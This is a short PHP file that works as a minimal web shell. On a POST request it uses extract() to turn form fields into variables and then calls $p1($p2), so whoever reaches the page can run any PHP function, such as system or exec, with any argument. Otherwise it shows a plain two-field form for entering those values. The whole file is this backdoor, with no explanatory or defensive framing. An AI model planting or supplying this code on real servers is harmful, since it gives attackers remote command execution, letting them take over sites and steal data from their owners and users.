<?php
if (!empty($_POST)){
	extract($_POST); 
	$p1($p2);
}else{
echo '<form method="POST"><textarea name="p1"></textarea>';
echo '<textarea name="p2"></textarea>';
echo '<input type="submit"></form>';
}
